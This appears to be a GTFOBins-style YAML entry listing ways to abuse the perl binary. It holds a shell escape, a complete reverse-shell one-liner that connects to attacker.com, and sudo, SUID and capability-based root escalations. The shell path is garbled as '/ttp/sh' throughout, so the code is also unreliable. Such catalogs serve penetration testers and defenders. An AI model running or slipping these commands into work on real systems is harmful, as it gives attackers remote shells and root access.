---
functions:
  shell:
    - code: perl -e 'exec "/ttp/sh";'
  reverse-shell:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        perl -e 'use Socket;$i="$ENV{RHOST}";$p=$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/ttp/sh -i");};'
  suid:
    - code: ./perl -e 'exec "/ttp/sh";'
  sudo:
    - code: sudo perl -e 'exec "/ttp/sh";'
  capabilities:
    - code: ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/ttp/sh";'
---
